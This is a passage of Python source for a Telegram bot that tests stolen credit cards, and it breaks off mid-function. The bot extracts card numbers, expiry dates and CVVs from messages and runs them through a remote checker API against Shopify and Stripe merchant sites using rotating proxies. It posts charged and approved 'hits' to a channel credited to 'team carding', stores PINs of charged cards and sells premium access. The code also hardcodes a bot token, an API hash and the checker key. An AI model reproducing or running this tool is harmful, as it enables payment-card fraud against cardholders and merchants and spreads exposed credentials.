from telethon import TelegramClient, events, Button
import asyncio
from telethon import errors
from telethon.tl import types as tl_types, functions
import aiohttp
# Connection reuse connector
_http_connector = aiohttp.TCPConnector(limit=50, enable_cleanup_closed=True)
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime, timedelta

API_ID = 30598540
API_HASH = '067ae5148b522f3dc9f8ff06df7cab66'

async def get_http_session():
    timeout = aiohttp.ClientTimeout(total=100)
    return aiohttp.ClientSession(connector=_http_connector, timeout=timeout)

# Read token from file (auto-updated by token-changer)
def get_bot_token():
    token_file = '/root/bot_token.txt'
    try:
        if os.path.exists(token_file):
            with open(token_file, 'r') as f:
                token = f.read().strip()
                if token:
                    return token
    except:
        pass
    return '8896219003:AAFsKSriA2IBT0Gkz1FdDwALtUuP8QQUEuw'  # default

BOT_TOKEN = get_bot_token()

import os

def get_user_proxy_file(user_id):
    os.makedirs('proxies', exist_ok=True)
    return f'proxies/proxy_{user_id}.txt'

def get_user_proxies(user_id):
    path = get_user_proxy_file(user_id)
    if not os.path.exists(path):
        return []
    with open(path, 'r') as f:
        return [l.strip() for l in f.readlines() if l.strip()]

def save_user_proxies(user_id, proxies):
    path = get_user_proxy_file(user_id)
    with open(path, 'w') as f:
        f.write('\n'.join(proxies))

ADMIN_ID = [8987165792,7671957436]
CHECKER_API_URL = 'https://shimmering-celebration-production-7dd0.up.railway.app/shopify'
CHECKER_API_KEY = 'AnonShopii2026!'
STRIPE_CHARGE_API_URL = 'https://www.tekside.com.tn/bot/'
VBV_API_URL = 'https://www.tekside.com.tn/api/check'
import random as _rnd

# Gateway Control
default_gateway = 'shopify'

# PIN Storage
CHARGED_PINS_DIR = 'charged_pins'
os.makedirs(CHARGED_PINS_DIR, exist_ok=True)

def save_charged_card_with_pin(card, pin, gateway, status):
    if not pin:
        return
    filename = os.path.join(CHARGED_PINS_DIR, f"{gateway}_{status}.txt")
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"{timestamp} | {card} | PIN: {pin}\n")
    except:
        pass

async def get_pin_for_card(card_number):
    if not os.path.exists(CHARGED_PINS_DIR):
        return None
    try:
        import aiofiles as _aiof
        for filename in os.listdir(CHARGED_PINS_DIR):
            if filename.endswith('.txt'):
                filepath = os.path.join(CHARGED_PINS_DIR, filename)
                async with _aiof.open(filepath, 'r', encoding='utf-8') as f:
                    async for line in f:
                        if card_number in line:
                            pin_match = re.search(r'PIN:\s*(\d+)', line)
                            if pin_match:
                                return pin_match.group(1)
    except:
        pass
    return None

PREMIUM_USERS_FILE = "premium_users.txt"
SITES_FILE = 'sites.txt'
STRIPE_SITES_FILE = 'stripe_sites.txt'
PROXY_FILE = 'proxy.txt'
PRICE_FILTERS_FILE = "price_filters.json"
SITES_WITH_PRICE_FILE = "sites_price.json"
KEYS_FILE = "keys.json"
STARS_FILE = "stars.json"
DAILY_STARS = 100
HITS_CHANNEL_ID = -1003942173333

import subprocess

def clear_session():
    session_file = 'checker_bot.session'
    for ext in ['', '-journal', '-shm', '-wal']:
        try:
            os.remove(f'{session_file}{ext}')
        except:
            pass
    # Also try to remove from /tmp if exists
    try:
        os.remove(f'/tmp/{session_file}')
    except:
        pass
    print('[!] Session files cleared')

def start_bot():
    try:
        _bot = TelegramClient(None, API_ID, API_HASH)
        _bot.start(bot_token=BOT_TOKEN)
        return _bot
    except Exception as e:
        err = str(e).lower()
        if 'session' in err or 'wrong session' in err or 'security error' in err:
            print(f'[!] Session error detected, clearing and retrying...')
            clear_session()
            _bot = TelegramClient(None, API_ID, API_HASH)
            _bot.start(bot_token=BOT_TOKEN)
            return _bot
        raise e

bot = start_bot()

# Token checker - auto-reconnect when token changes
LAST_TOKEN = BOT_TOKEN

def check_token_change():
    global LAST_TOKEN, bot
    try:
        new_token = get_bot_token()
        if new_token != LAST_TOKEN:
            print(f'[*] Token changed! Restarting bot...')
            LAST_TOKEN = new_token
            # Schedule restart
            asyncio.ensure_future(restart_bot())
    except:
        pass

async def restart_bot():
    global bot, LAST_TOKEN
    try:
        await bot.disconnect()
    except:
        pass
    # Clear session on restart to avoid session ID mismatch
    session_file = 'checker_bot.session'
    for ext in ['', '-journal']:
        try:
            os.remove(f'{session_file}{ext}')
        except:
            pass
    try:
        LAST_TOKEN = get_bot_token()
        bot = TelegramClient(None, API_ID, API_HASH)
        await bot.start(bot_token=LAST_TOKEN)
        register_handlers()
        print(f'[+] Bot restarted with new token!')
    except Exception as e:
        print(f'[-] Restart error: {e}')

def register_handlers():
    # Re-register all event handlers here
    pass

# Start token checker task
async def token_checker_task():
    while True:
        await asyncio.sleep(60)  # Check every minute
        check_token_change()

# Check expired premiums every 5 minutes
async def premium_checker_task():
    while True:
        await asyncio.sleep(300)  # 5 minutes
        try:
            await check_expired_premiums()
        except:
            pass

# Payment button - user pays 100 stars for 1 day access
async def payment_checker_task():
    while True:
        await asyncio.sleep(60)  # Check every minute
        try:
            # Check for expired subscriptions
            data = load_premium_data()
            now = datetime.now()
            changed = False
            for uid in list(data.keys()):
                if int(uid) in ADMIN_ID:
                    continue
                expiry = data[uid].get('expiry')
                if expiry:
                    exp_dt = datetime.fromisoformat(expiry)
                    if exp_dt < now:
                        # Notify expiry
                        try:
                            u = await bot.get_entity(int(uid))
                            username = f"@{u.username}" if u.username else u.first_name or "Unknown"
                        except:
                            username = "Unknown"
                        try:
                            msg = f"""❌ <b>Sᴜʙsᴄʀɪᴘᴛɪᴏɴ Exᴘɪʀᴇᴅ</b>

👤 <a href=\"tg://user?id={uid}\">{username}</a> (<code>{uid}</code>)
⏰ Access ended"""
                            await bot.send_message(HITS_CHANNEL_ID, premium_emoji(msg), parse_mode='html')
                        except:
                            pass
                        del data[uid]
                        changed = True
            if changed:
                save_premium_data(data)
        except Exception as e:
            print(f'[-] Payment checker error: {e}')

active_sessions = {}
TEMP_FILE_DATA = {}
SHOPIFY_SESSION_RESULTS = {}
COLLECT_DATA = {}
COLLECT_TIMERS = {}
MERGE_DATA = {}
MERGE_TIMERS = {}

PREMIUM_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
    "🔥 charged": "5766866267810043620", "✅ approved": "5039793437776282663",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5343649643685240676", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "4904936030232117798", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5444931419270839381", "🔌": "5120722716260828125", "⭐️": "5172716095697584957",
    "🆓": "5406756500108501710", "👑": "6266995104687330978", "🔍": "5258396243666681152",
    "⏱️": "5343927661213279013", "💥": "5122933683820430249", "🆔": "5447311106030726740",
    "👤": "5445174334031166029", "📅": "5343927661213279013", "🔄": "5454245266305604993",
    "🏦": "5445408306669582934", "🥰": "5444931419270839381", "😱": "5447181973544008180",
    "🔷": "5258024802010026053", "🔑": "5454386656628991407", "📆": "5343927661213279013",
    "👥": "5454371323595744068", "🥕": "5447653032672129347", "➡️": "5445350109862720603",
    "🦉": "5123344136665039833", "🍑": "5445408306669582934", "💪": "5305622454218024328",
    "🌝": "5341684837881235158", "📁": "5444908424015934570", "ℹ️": "5289930378885214069",
    "💀": "5231338559587257737", "📢": "5116445341150872576", "💰": "5116648080787112958",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304", "👇": "5122933683820430249",
    "📌": "5447187153274567373", "🍳": "5305622454218024328", "💸": "5283232570660634549",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958",
      "🚫": "5116151848855667552",
    "🛒": "5447319442562251569", "🔧": "4904936030232117798",
    "⛔️": "5275969776668134187", "🥲": "4904468402782864209",
    "☠️": "5231338559587257737", "🛡": "5219672809936006424",
    "📸": "5445344161333015312", "💬": "5447510826304959724",
    "😺": "5118590136149345664", "🌍": "5303440357428586778",
    "🔹": "5429436388447655367", "📹": "5445158077579952110",
    "📡": "5447448489149625830", "🌟": "5310224206732996002",
    "📍": "5447187153274567373", "🔐": "5258476306152038031",
    "😇": "6321225560789877992", "👌": "5445350109862720603",
    "⭐": "6267298050205553492", "🍭": "6267152480878990865",
    "⚙️": "5258023599419171861", "⛔": "4918014360267260850",
    "📥": "5350747347724810871", "💵": "5350711759625795085",
    "️🏷️": "5436285465420383204",
    "📂": "5444908424015934570", "🛠️": "5348239232852836489",
    "📄️": "5323538339062628165",


}


FLAGS = {
    'AD': '🇦🇩', 'AE': '🇦🇪', 'AF': '🇦🇫', 'AG': '🇦🇬', 'AI': '🇦🇮',
    'AL': '🇦🇱', 'AM': '🇦🇲', 'AO': '🇦🇴', 'AQ': '🇦🇶', 'AR': '🇦🇷',
    'AS': '🇦🇸', 'AT': '🇦🇹', 'AU': '🇦🇺', 'AW': '🇦🇼', 'AX': '🇦🇽',
    'AZ': '🇦🇿', 'BA': '🇧🇦', 'BB': '🇧🇧', 'BD': '🇧🇩', 'BE': '🇧🇪',
    'BF': '🇧🇫', 'BG': '🇧🇬', 'BH': '🇧🇭', 'BI': '🇧🇮', 'BJ': '🇧🇯',
    'BL': '🇧🇱', 'BM': '🇧🇲', 'BN': '🇧🇳', 'BO': '🇧🇴', 'BQ': '🇧🇶',
    'BR': '🇧🇷', 'BS': '🇧🇸', 'BT': '🇧🇹', 'BV': '🇧🇻', 'BW': '🇧🇼',
    'BY': '🇧🇾', 'BZ': '🇧🇿', 'CA': '🇨🇦', 'CC': '🇨🇨', 'CD': '🇨🇩',
    'CF': '🇨🇫', 'CG': '🇨🇬', 'CH': '🇨🇭', 'CI': '🇨🇮', 'CK': '🇨🇰',
    'CL': '🇨🇱', 'CM': '🇨🇲', 'CN': '🇨🇳', 'CO': '🇨🇴', 'CR': '🇨🇷',
    'CU': '🇨🇺', 'CV': '🇨🇻', 'CW': '🇨🇼', 'CX': '🇨🇽', 'CY': '🇨🇾',
    'CZ': '🇨🇿', 'DE': '🇩🇪', 'DJ': '🇩🇯', 'DK': '🇩🇰', 'DM': '🇩🇲',
    'DO': '🇩🇴', 'DZ': '🇩🇿', 'EC': '🇪🇨', 'EE': '🇪🇪', 'EG': '🇪🇬',
    'EH': '🇪🇭', 'ER': '🇪🇷', 'ES': '🇪🇸', 'ET': '🇪🇹', 'FI': '🇫🇮',
    'FJ': '🇫🇯', 'FK': '🇫🇰', 'FM': '🇫🇲', 'FO': '🇫🇴', 'FR': '🇫🇷',
    'GA': '🇬🇦', 'GB': '🇬🇧', 'GD': '🇬🇩', 'GE': '🇬🇪', 'GF': '🇬🇫',
    'GG': '🇬🇬', 'GH': '🇬🇭', 'GI': '🇬🇮', 'GL': '🇬🇱', 'GM': '🇬🇲',
    'GN': '🇬🇳', 'GP': '🇬🇵', 'GQ': '🇬🇶', 'GR': '🇬🇷', 'GS': '🇬🇸',
    'GT': '🇬🇹', 'GU': '🇬🇺', 'GW': '🇬🇼', 'GY': '🇬🇾', 'HK': '🇭🇰',
    'HM': '🇭🇲', 'HN': '🇭🇳', 'HR': '🇭🇷', 'HT': '🇭🇹', 'HU': '🇭🇺',
    'ID': '🇮🇩', 'IE': '🇮🇪', 'IL': '🇮🇱', 'IM': '🇮🇲', 'IN': '🇮🇳',
    'IO': '🇮🇴', 'IQ': '🇮🇶', 'IR': '🇮🇷', 'IS': '🇮🇸', 'IT': '🇮🇹',
    'JE': '🇯🇪', 'JM': '🇯🇲', 'JO': '🇯🇴', 'JP': '🇯🇵', 'KE': '🇰🇪',
    'KG': '🇰🇬', 'KH': '🇰🇭', 'KI': '🇰🇮', 'KM': '🇰🇲', 'KN': '🇰🇳',
    'KP': '🇰🇵', 'KR': '🇰🇷', 'KW': '🇰🇼', 'KY': '🇰🇾', 'KZ': '🇰🇿',
    'LA': '🇱🇦', 'LB': '🇱🇧', 'LC': '🇱🇨', 'LI': '🇱🇮', 'LK': '🇱🇰',
    'LR': '🇱🇷', 'LS': '🇱🇸', 'LT': '🇱🇹', 'LU': '🇱🇺', 'LV': '🇱🇻',
    'LY': '🇱🇾', 'MA': '🇲🇦', 'MC': '🇲🇨', 'MD': '🇲🇩', 'ME': '🇲🇪',
    'MF': '🇲🇫', 'MG': '🇲🇬', 'MH': '🇲🇭', 'MK': '🇲🇰', 'ML': '🇲🇱',
    'MM': '🇲🇲', 'MN': '🇲🇳', 'MO': '🇲🇴', 'MP': '🇲🇵', 'MQ': '🇲🇶',
    'MR': '🇲🇷', 'MS': '🇲🇸', 'MT': '🇲🇹', 'MU': '🇲🇺', 'MV': '🇲🇻',
    'MW': '🇲🇼', 'MX': '🇲🇽', 'MY': '🇲🇾', 'MZ': '🇲🇿', 'NA': '🇳🇦',
    'NC': '🇳🇨', 'NE': '🇳🇪', 'NF': '🇳🇫', 'NG': '🇳🇬', 'NI': '🇳🇮',
    'NL': '🇳🇱', 'NO': '🇳🇴', 'NP': '🇳🇵', 'NR': '🇳🇷', 'NU': '🇳🇺',
    'NZ': '🇳🇿', 'OM': '🇴🇲', 'PA': '🇵🇦', 'PE': '🇵🇪', 'PF': '🇵🇫',
    'PG': '🇵🇬', 'PH': '🇵🇭', 'PK': '🇵🇰', 'PL': '🇵🇱', 'PM': '🇵🇲',
    'PN': '🇵🇳', 'PR': '🇵🇷', 'PS': '🇵🇸', 'PT': '🇵🇹', 'PW': '🇵🇼',
    'PY': '🇵🇾', 'QA': '🇶🇦', 'RE': '🇷🇪', 'RO': '🇷🇴', 'RS': '🇷🇸',
    'RU': '🇷🇺', 'RW': '🇷🇼', 'SA': '🇸🇦', 'SB': '🇸🇧', 'SC': '🇸🇨',
    'SD': '🇸🇩', 'SE': '🇸🇪', 'SG': '🇸🇬', 'SH': '🇸🇭', 'SI': '🇸🇮',
    'SJ': '🇸🇯', 'SK': '🇸🇰', 'SL': '🇸🇱', 'SM': '🇸🇲', 'SN': '🇸🇳',
    'SO': '🇸🇴', 'SR': '🇸🇷', 'SS': '🇸🇸', 'ST': '🇸🇹', 'SV': '🇸🇻',
    'SX': '🇸🇽', 'SY': '🇸🇾', 'SZ': '🇸🇿', 'TC': '🇹🇨', 'TD': '🇹🇩',
    'TF': '🇹🇫', 'TG': '🇹🇬', 'TH': '🇹🇭', 'TJ': '🇹🇯', 'TK': '🇹🇰',
    'TL': '🇹🇱', 'TM': '🇹🇲', 'TN': '🇹🇳', 'TO': '🇹🇴', 'TR': '🇹🇷',
    'TT': '🇹🇹', 'TV': '🇹🇻', 'TW': '🇹🇼', 'TZ': '🇹🇿', 'UA': '🇺🇦',
    'UG': '🇺🇬', 'UM': '🇺🇲', 'US': '🇺🇸', 'UY': '🇺🇾', 'UZ': '🇺🇿',
    'VA': '🇻🇦', 'VC': '🇻🇨', 'VE': '🇻🇪', 'VG': '🇻🇬', 'VI': '🇻🇮',
    'VN': '🇻🇳', 'VU': '🇻🇺', 'WF': '🇼🇫', 'WS': '🇼🇸', 'XK': '🇽🇰',
    'YE': '🇾🇪', 'YT': '🇾🇹', 'ZA': '🇿🇦', 'ZM': '🇿🇲', 'ZW': '🇿🇼'
}

def get_flag(code):
    return FLAGS.get(str(code).upper(), '◻️')
    
    
DEFAULT_FILTERS = [
    {"name": "0~10", "min": 0, "max": 10},
    {"name": "10~50", "min": 10, "max": 50},
    {"name": "50~200", "min": 50, "max": 200},
    {"name": "200~ & ", "min": 200, "max": 999999},
    {"name": "Aʟʟ Sɪᴛᴇs", "min": 0, "max": 999999, "all": True}
]

def premium_emoji(text: str) -> str:
    if not text:
        return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
    return result

def get_main_menu_keyboard(user_id=None):
    buttons = [
        [Button.inline(" Cᴍᴅ", b"show_cmds", style="primary", icon=4904936030232117798),
         Button.inline(" Tᴏᴏʟs", b"tools_menu", style="primary", icon=5361734213370396027)],
        [Button.url(" Cʜᴀɴɴᴇʟ", "https://t.me/zzwze", style="success", icon=5445408306669582934)]
    ]
    if user_id and user_id in ADMIN_ID:
        buttons.append([Button.inline(" Aᴅᴍɪɴ Pᴀɴᴇʟ", b"admin_panel", style="success", icon=6266995104687330978)])
    return buttons

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def load_premium_data():
    """Load premium data with expiry times"""
    data_file = 'premium_data.json'
    if not os.path.exists(data_file):
        # Migrate from old format
        data = {}
        if os.path.exists(PREMIUM_USERS_FILE):
            with open(PREMIUM_USERS_FILE, 'r') as f:
                for line in f:
                    uid = line.strip()
                    if uid:
                        data[uid] = {'expiry': None, 'added_by': None}
            # Save as new format
            with open(data_file, 'w') as f:
                json.dump(data, f)
        return data
    try:
        with open(data_file, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_premium_data(data):
    with open('premium_data.json', 'w') as f:
        json.dump(data, f)

def load_premium_users():
    data = load_premium_data()
    now = datetime.now()
    # Remove expired users (except admins)
    changed = False
    for uid in list(data.keys()):
        if int(uid) in ADMIN_ID:
            continue
        expiry = data[uid].get('expiry')
        if expiry and datetime.fromisoformat(expiry) < now:
            del data[uid]
            changed = True
    if changed:
        save_premium_data(data)
    return list(data.keys())

def load_sites():
    return get_file_lines(SITES_FILE)

def load_stripe_sites():
    return get_file_lines(STRIPE_SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

async def check_expired_premiums():
    """Check and notify about expired premiums"""
    data = load_premium_data()
    now = datetime.now()
    changed = False
    for uid in list(data.keys()):
        if int(uid) in ADMIN_ID:
            continue
        expiry = data[uid].get('expiry')
        if expiry:
            exp_dt = datetime.fromisoformat(expiry)
            if exp_dt < now:
                # Notify expiry
                try:
                    u = await bot.get_entity(int(uid))
                    username = f"@{u.username}" if u.username else u.first_name or "Unknown"
                except:
                    username = "Unknown"
                try:
                    msg = f"""❌ <b>Pʀᴇᴍɪᴜᴍ Exᴘɪʀᴇᴅ</b>

👤 <a href=\"tg://user?id={uid}\">{username}</a> (<code>{uid}</code>)
⏰ Dᴜʀᴀᴛɪᴏɴ ENDED"""
                    await bot.send_message(HITS_CHANNEL_ID, premium_emoji(msg), parse_mode='html')
                except:
                    pass
                del data[uid]
                changed = True
    if changed:
        save_premium_data(data)

def is_premium(user_id):
    data = load_premium_data()
    uid = str(user_id)
    if uid not in data:
        return False
    if int(user_id) in ADMIN_ID:
        return True
    expiry = data[uid].get('expiry')
    if not expiry:
        return True  # permanent
    return datetime.fromisoformat(expiry) > datetime.now()

async def add_premium_user(user_id, hours=None, added_by=None):
    data = load_premium_data()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {}
    if hours:
        now = datetime.now()
        existing_expiry = data[uid].get('expiry')
        if existing_expiry and datetime.fromisoformat(existing_expiry) > now:
            # Extend from current expiry
            new_expiry = datetime.fromisoformat(existing_expiry) + timedelta(hours=hours)
        else:
            new_expiry = now + timedelta(hours=hours)
        data[uid]['expiry'] = new_expiry.isoformat()
    else:
        data[uid]['expiry'] = None  # permanent
    if added_by:
        data[uid]['added_by'] = added_by
    save_premium_data(data)
    return True

async def remove_premium_user(user_id):
    data = load_premium_data()
    uid = str(user_id)
    if uid in data:
        del data[uid]
        save_premium_data(data)
        return True
    return False

def generate_key():
    random_part = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=15))
    return f"ZNZII_{random_part}"

# Stars System
def load_stars():
    if not os.path.exists(STARS_FILE):
        return {}
    try:
        with open(STARS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_stars(data):
    with open(STARS_FILE, 'w') as f:
        json.dump(data, f)

def get_stars(user_id):
    data = load_stars()
    return data.get(str(user_id), 0)

def add_stars(user_id, amount):
    data = load_stars()
    uid = str(user_id)
    data[uid] = data.get(uid, 0) + amount
    save_stars(data)
    return data[uid]

def use_stars(user_id, amount):
    data = load_stars()
    uid = str(user_id)
    current = data.get(uid, 0)
    if current >= amount:
        data[uid] = current - amount
        save_stars(data)
        return True
    return False

async def daily_stars_task():
    """Give 100 stars to all premium users every day"""
    while True:
        await asyncio.sleep(86400)  # 24 hours
        try:
            premium_users = load_premium_users()
            for uid in premium_users:
                add_stars(int(uid), DAILY_STARS)
            print(f'[+] Daily stars given to {len(premium_users)} users')
        except Exception as e:
            print(f'[-] Daily stars error: {e}')

async def load_keys():
    if not os.path.exists(KEYS_FILE):
        return {}
    try:
        with open(KEYS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

async def save_keys(keys):
    with open(KEYS_FILE, 'w') as f:
        json.dump(keys, f, indent=4)

async def load_price_filters():
    if not os.path.exists(PRICE_FILTERS_FILE):
        return {}
    try:
        with open(PRICE_FILTERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

async def save_price_filters(filters):
    with open(PRICE_FILTERS_FILE, 'w') as f:
        json.dump(filters, f, indent=4)

async def load_sites_with_price():
    if not os.path.exists(SITES_WITH_PRICE_FILE):
        return []
    try:
        with open(SITES_WITH_PRICE_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

async def save_sites_with_price(data):
    with open(SITES_WITH_PRICE_FILE, 'w') as f:
        json.dump(data, f, indent=4)

def get_price_from_response(raw_response):
    try:
        price = raw_response.get('Price', '-')
        if price != '-' and price != 0:
            try:
                price_clean = str(price).replace('$', '').replace(',', '').strip()
                return float(price_clean)
            except:
                return 0.0
        return 0.0
    except:
        return 0.0

def is_site_dead(response_msg, gateway, price):
    if not response_msg and not gateway:
        return True
    # لا نشيل site بسبب السعر
    
    response_lower = response_msg.lower()
    dead_keywords = [
        'receipt id is empty', 'handle is empty', 'product id is empty',
        'tax amount is empty', 'payment method identifier is empty',
        'invalid url', 'error in 1st req', 'error in 1 req',
        'cloudflare', 'connection failed', 'timed out',
        'access denied', 'tlsv1 alert', 'ssl routines',
        'could not resolve', 'domain name not found',
        'name or service not known', 'openssl ssl_connect',
        'empty reply from server', 'httperror504', 'http error',
        'httperror504', 'timeout', 'unreachable', 'ssl error',
        '502', '503', '504', 'bad gateway', 'service unavailable',
        'gateway timeout', 'network error', 'connection reset',
        'failed to detect product', 'failed to create checkout',
        'failed to tokenize card', 'failed to get proposal data',
        'submit rejected', 'handle error', 'http 404',
        'delivery_delivery_line_detail_changed', 'delivery_address2_required',
        'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
        'site dead', 'site dead', 'captcha_required', 'captcha required',
        'site errors', 'site errors: failed to tokenize card',
        'not supported', 'unsupported', 'site not supported',
        'invalid site', 'connection refused',
        'no response', 'host not found', 'domain not found',
        'could not connect', 'connection error', 'request timeout',
        'gateway error', 'internal server error',
        'http 500', 'http 502', 'http 503', 'http 504'
    ]
    
    for keyword in dead_keywords:
        if keyword in response_lower:
            return True
    
    return False

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        session = await get_http_session()
        async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
            if res.status != 200:
                return '-', '-', '-', '-', '-', ''
            response_text = await res.text()
            try:
                data = json.loads(response_text)
                return data.get('brand', '-'), data.get('type', '-'), data.get('level', '-'), data.get('bank', '-'), data.get('country_name', '-'), data.get('country_flag', '')
            except:
                return '-', '-', '-', '-', '-', ''
    except:
        return '-', '-', '-', '-', '-', ''

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

async def send_hit_to_channel(card, status, response, gateway, price, user_id=None, username=None):
    if HITS_CHANNEL_ID == 0:
        return
    try:
        if "CHARGED" in status.upper() or "ORDER_PLACED" in status.upper():
            status_text = premium_emoji("💎 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 🔥")
            should_pin = True
        elif "APPROVED" in status.upper():
            status_text = premium_emoji("✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅")
            should_pin = False
        else:
            status_text = premium_emoji(f"📌 {status}")
            should_pin = False
        now = datetime.now()
        time_str = now.strftime("%H:%M:%S")
        
        if "CHARGED" in status.upper() or "ORDER_PLACED" in status.upper():
            st_emoji = '<tg-emoji emoji-id="5766866267810043620">🔥</tg-emoji>'
            st_label = "Charged"
        else:
            st_emoji = '<tg-emoji emoji-id="5039793437776282663">✅</tg-emoji>'
            st_label = "Approved"
        
        gw_emoji = '<tg-emoji emoji-id="5809648497175043777">🛒</tg-emoji>'
        re_emoji = '<tg-emoji emoji-id="5301185336389416490">⚙️</tg-emoji>'
        ti_emoji = '<tg-emoji emoji-id="5300794855142733883">⏰</tg-emoji>'
        dk_emoji = '<tg-emoji emoji-id="5303292949856007381">🐉</tg-emoji>'
        
        if username:
            mention = f'👤 @{username}'
        elif user_id:
            mention = f'👤 <a href="tg://user?id={user_id}">{user_id}</a>'
        else:
            mention = ''
        price_emoji = '💰'
        msg = f"""{st_emoji} <b>{st_label}</b>
{gw_emoji} Gateway {gateway}
{re_emoji} {response[:45]}
{price_emoji} Price {price}
{ti_emoji} {time_str}
{mention}
{dk_emoji} <b><a href='tg://user?id=8987165792'>𝘁𝗲𝗮𝗺 𝗰𝗮𝗿𝗱𝗶𝗻𝗴</a></b>"""
        sent_msg = await bot.send_message(abs(HITS_CHANNEL_ID), msg, parse_mode='html')
        if should_pin:
            try:
                await bot.pin_message(abs(HITS_CHANNEL_ID), sent_msg.id)
            except:
                pass
    except:
        pass

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}
        if not site.startswith('http'):
            site = f'https://{site}'
        proxy_str = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                ip, port, user, password = proxy_parts
                proxy_str = f"{ip}:{port}:{user}:{password}"
            elif len(proxy_parts) == 2:
                ip, port = proxy_parts
                proxy_str = f"{ip}:{port}"
            else:
                proxy_str = proxy
        url = f'{CHECKER_API_URL}?site={site}&cc={card}&key={CHECKER_API_KEY}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        session = await get_http_session()
        async with session.get(url) as resp:
                if resp.status != 200:
                    return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
                try:
                    raw = await resp.json()
                except:
                    text = await resp.text()
                    return {'status': 'Site Error', 'message': f'Invalid JSON: {text[:100]}', 'card': card, 'retry': True}
        response_msg = raw.get('card_response', raw.get('Response', ''))
        price = raw.get('price', raw.get('Price', '-'))
        price_value = get_price_from_response(raw)
        if price != '-' and price != 0:
            price_display = f"${price}"
        else:
            price_display = '-'
        gateway = raw.get('gate', raw.get('Gateway', 'Shopify'))
        if is_site_dead(response_msg, gateway, price_display):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
        response_lower = response_msg.lower()
        if 'charged' in response_lower or 'order_placed' in response_lower or 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
        elif any(key in response_lower for key in ['approved', 'success', 'insufficient_funds', 'insufficient funds', 'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc', 'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc', 'incorrect_zip', 'incorrect zip', 'cvv issue', '3d', '3d secure', 'otp', 'verification required', 'authenticate', 'authentication required', 'challenge required', 'redirecting to bank', 'bank verification', 'send code', 'enter code', 'verify']):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
        elif 'declined' in response_lower or 'card_declined' in response_lower:
            return {'status': 'Declined', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
        else:
            return {'status': 'Declined', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
    except aiohttp.ClientConnectorError as e:
        return {'status': 'Site Error', 'message': 'Connection failed - retrying', 'card': card, 'retry': True}
    except aiohttp.ClientError as e:
        return {'status': 'Site Error', 'message': f'Client error: {str(e)[:50]}', 'card': card, 'retry': True}
    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        return {'status': 'Declined', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}

# ردود تستدعي إعادة المحاولة على site مختلف
RETRY_RESPONSES = [
    'no_product', 'no products found', 'throttled', 'no_shopify_payments_gateway',
    'site_requires_login', 'no_session_token', 'cart_failed',
    'out of stock', 'login required', 'access denied', 'tokenization_failed'
]

async def check_card_with_retry(card, sites, proxies, max_retries=999):
    if not sites:
        return {'status': 'Declined', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
    if not proxies:
        return {'status': 'Declined', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
    
    tried_sites = set()
    for attempt in range(max_retries):
        # اختار site لم يتم تجربتها
        available = [s for s in sites if s not in tried_sites]
        if not available:
            tried_sites.clear()
            available = sites
        site = random.choice(available)
        tried_sites.add(site)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)
        msg_lower = result.get('message', '').lower()
        
